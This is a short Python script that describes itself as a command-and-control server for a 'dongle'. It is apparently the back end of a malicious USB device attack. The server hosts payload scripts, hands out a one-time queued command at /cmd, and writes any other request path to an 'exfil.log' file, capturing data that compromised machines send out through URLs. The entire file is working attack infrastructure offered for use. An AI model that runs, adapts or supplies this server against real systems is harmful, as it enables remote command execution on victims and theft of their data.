#!/usr/bin/env python3
"""C2 server for the dongle: serves scripts, /cmd queue, logs exfil URL paths."""
import http.server
import os
import re
import threading
import time

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "exfil.log")
CMD = os.path.join(BASE, "cmd")
lock = threading.Lock()


def log(line):
    with lock:
        with open(LOG, "a") as f:
            f.write("%s %s\n" % (time.strftime("%H:%M:%S"), line))


class H(http.server.BaseHTTPRequestHandler):
    def _empty(self):
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _body(self, data):
        self.send_response(200)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = self.path
        if path == "/cmd":
            if os.path.exists(CMD):
                with open(CMD, "rb") as f:
                    data = f.read()
                os.rename(CMD, CMD + ".consumed")
                log("CMD_SERVED %d bytes" % len(data))
                self._body(data)
            else:
                self._empty()
            return
        m = re.match(r"^/([A-Za-z0-9_.-]+)$", path)
        if m:
            fp = os.path.join(BASE, m.group(1))
            if os.path.isfile(fp):
                with open(fp, "rb") as f:
                    self._body(f.read())
                return
        log("EXFIL %s" % path)
        self._empty()

    def log_message(self, fmt, *args):
        pass


class Srv(http.server.ThreadingHTTPServer):
    daemon_threads = True


if __name__ == "__main__":
    Srv(("0.0.0.0", 8000), H).serve_forever()
